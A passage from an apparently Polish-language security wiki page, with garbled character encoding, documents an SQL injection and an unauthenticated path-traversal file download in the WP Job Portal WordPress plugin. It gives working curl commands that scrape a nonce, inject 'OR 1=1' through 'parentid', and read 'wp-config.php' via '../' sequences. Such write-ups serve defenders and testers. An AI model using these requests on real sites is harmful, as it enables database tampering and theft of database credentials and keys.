$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemy wprowadzone przez ten fragment:

1. **Niesanitizowane dane wejÅ›ciowe uÅ¼ytkownika** â€“ `parentid` pochodzi bezpoÅ›rednio z Å¼Ä…dania HTTP.
2. **Konkatenacja Å‚aÅ„cuchÃ³w w klauzuli WHERE** â€“ brak `is_numeric()` / `esc_sql()` / przygotowanej instrukcji.
3. **Nieautoryzowana dostÄ™pnoÅ›Ä‡** â€“ chociaÅ¼ akcja jest wykonywana przez `admin-post.php`, jedynym sprawdzeniem jest **CSRF nonce** (`wp_verify_nonce()`), ktÃ³ry kaÅ¼dy odwiedzajÄ…cy moÅ¼e pobraÄ‡ z publicznej strony osadzajÄ…cej shortcode `[wpjobportal_my_resumes]`.

#### Wykorzystanie

1. ZdobÄ…dÅº Å›wieÅ¼y nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Wstrzyknij dowolne SQL, naduÅ¼ywajÄ…c `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
OdpowiedÅº ujawnia wynik wstrzykniÄ™tego zapytania lub zmienia bazÄ™ danych, co dowodzi SQLi.


### Nieautoryzowane pobieranie dowolnych plikÃ³w / Przechodzenie przez Å›cieÅ¼ki (WP Job Portal <= 2.3.2)

Inne zadanie, **downloadcustomfile**, pozwalaÅ‚o odwiedzajÄ…cym pobieraÄ‡ **dowolny plik na dysku** poprzez przechodzenie przez Å›cieÅ¼ki. WraÅ¼liwy punkt znajduje siÄ™ w `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` jest kontrolowany przez atakujÄ…cego i Å‚Ä…czony **bez sanitizacji**. Ponownie, jedynÄ… barierÄ… jest **CSRF nonce**, ktÃ³ry moÅ¼na pobraÄ‡ z strony podsumowania.

#### Wykorzystanie
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Serwer odpowiada zawartoÅ›ciÄ… `wp-config.php`, ujawniajÄ…c dane uwierzytelniajÄ…ce DB i klucze autoryzacyjne.

## Odniesienia

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)

{{#include ../../banners/hacktricks-training.md}}
